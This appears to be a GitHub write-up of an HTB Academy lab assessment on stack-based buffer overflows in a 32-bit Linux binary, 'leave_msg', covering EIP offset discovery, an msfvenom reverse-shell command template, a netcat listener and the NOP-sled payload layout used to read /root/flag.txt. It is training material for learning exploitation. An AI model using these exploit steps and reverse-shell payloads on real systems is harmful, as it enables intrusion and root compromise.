# skills-assesment---STACK-BASED-BUFFER-OVERFLOWS-ON-LINUX-X86

![Screenshot 2022-06-10 at 23 19 07](https://user-images.githubusercontent.com/86610861/173449233-bd3ae29c-2786-412f-b4f7-6c2e847b76f2.png)

## Questions:

![6f6dbd3e-83f8-455e-84c3-1eadb281d27c](https://user-images.githubusercontent.com/86610861/173449318-93658307-b08d-4bc1-83cb-b54cc211b3a7.png)


## This writeup contains following chapters:
setup
file type of "leave_msg"
reach EIP
overwrite EIP and determine stack space size
read file "/root/flag.txt"

Setup

![Screenshot 2022-06-11 at 16 27 40](https://user-images.githubusercontent.com/86610861/173449468-f0b82bce-dcea-43f2-a021-29cb99b6e2fb.png)

Spawn the target system and get vpn key. after vpn is downloaded open it with
sudo openvpn academy.ovpn
Note: you must have vpn opened and running, otherwise you won't be able to ssh to with user "htb-student".
Open new terminal window and ssh to user "htb-student" type the following
ssh htb-student@{your target ip}
Then it will ask you for your password in which you should type 
HTB_@cademy_stdnt!
Now you are all set to start answering questions.
File type of "leave_msg"
Find out file type of leave_msg binary with file command.

![Screenshot 2022-06-11 at 16 13 05](https://user-images.githubusercontent.com/86610861/173453157-4961e549-3950-4d84-9313-f0fe35992ad1.png)

file command is linux command which determines file's type depending on what the file contains
Here we have the answer: ELF 32-bit file type

![Screenshot 2022-06-11 at 16 23 15](https://user-images.githubusercontent.com/86610861/173453098-03243645-4a43-43f9-bcce-a0f01420d978.png)


Reach EIP
Now we have to reach EIP.
open new terminal window and that is not connected to ssh server.
we have to create a unique pattern using Metasploit.
i wanted to create pattern that is long so that it would most likely cause segmentation fault.
![Screenshot 2022-06-11 at 17 00 24](https://user-images.githubusercontent.com/86610861/173449944-55355432-4f6d-4a32-999e-6a5cf7d09325.png)

pattern is created and now we have to open "leave_msg" with gdb with a terminal in which we are connected to ssh. type following:
gdb leave_msg
then we have to run the pattern to cause segmentation fault and check registers for eip address.
Run pattern:
run $(python -c 'print "{your unique pattern}"')
Check info registers:

![Screenshot 2022-06-11 at 17 14 48](https://user-images.githubusercontent.com/86610861/173449904-7d10ed5d-e36d-4625-b87e-672170773ad6.png)

notice the address next to eip register. copy that and then we find exact offset depending on EIP value. open the terminal in which we are NOT connected to ssh and type following.

![Screenshot 2022-06-11 at 17 11 07](https://user-images.githubusercontent.com/86610861/173451722-50c7d4aa-45fd-43f1-b535-a1759884624d.png)

Here it returns exact offset.

![Screenshot 2022-06-11 at 16 24 22](https://user-images.githubusercontent.com/86610861/173455512-ea791b23-4862-49ee-a24f-641cb5112ea5.png)

but if we want to overwrite EIP then we have to send 2064 bytes.
Overwrite EIP and determine stack space size
In ssh terminal type info proc all

![Screenshot 2022-06-11 at 17 19 52](https://user-images.githubusercontent.com/86610861/173452066-6593098c-57ec-4ae1-bc09-d17ff7d9186c.png)

info proc command shows the file descriptors opened by the processbefore [stack] in size field you can see 0x22000.



that's the answer we are looking for.

![Screenshot 2022-06-11 at 16 24 45](https://user-images.githubusercontent.com/86610861/173452720-507f9c93-3b72-4458-b4f4-1a3f82b6639c.png)


Read file "/root/flag.txt"
chapters :
generate shellcode
setup netcat listener
run exploit

Generate shellcode
MSFvenom - standalone payload generator

![Screenshot 2022-06-13 at 17 28 48](https://user-images.githubusercontent.com/86610861/173449802-e82c9ea8-9571-4f12-92bd-c85b5379adb8.png)

syntax - msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
  
  ![Screenshot 2022-06-13 at 17 29 07](https://user-images.githubusercontent.com/86610861/173455702-1b5335a9-a686-4253-95bf-e17f9efc8ec4.png)
  
  Setup netcat listener
note: setup netcat listener in ssh.
  
  ![Screenshot 2022-06-13 at 18 42 18](https://user-images.githubusercontent.com/86610861/173458599-dc05ae8c-48bf-4293-a7b7-acf6eeaeb8b6.png)
  
run exploit
note: run exploit IN SSH,  OUTSIDE GDB
Buffer = "\x55" * (2064 - 124 - 95 - 4) - 1841 bytes
     NOPs = "\x90" * 124 - 124bytes
Shellcode = "{your shellcode}" - 95bytes
      EIP = "\x2c\xd7\xff\xff" - 4bytes
  
  ![Screenshot 2022-06-13 at 17 19 11](https://user-images.githubusercontent.com/86610861/173458718-f6024397-c983-4a24-9345-74753afe122d.png)

  
  
after running our exploit we get a message connection received.type id to make sure you have a shell.
if we have shell we will get information about user. after that type in command to get a flag:
cat /root/flag.txt
  
![Screenshot 2022-06-13 at 17 18 48](https://user-images.githubusercontent.com/86610861/173449651-cf32e153-677e-4720-babb-d8f446944d6c.png)
  
  ![Screenshot 2022-06-13 at 16 28 01](https://user-images.githubusercontent.com/86610861/173458749-ed2ac1fb-e1f1-46bf-afee-a12ba6bb1cf1.png)

  
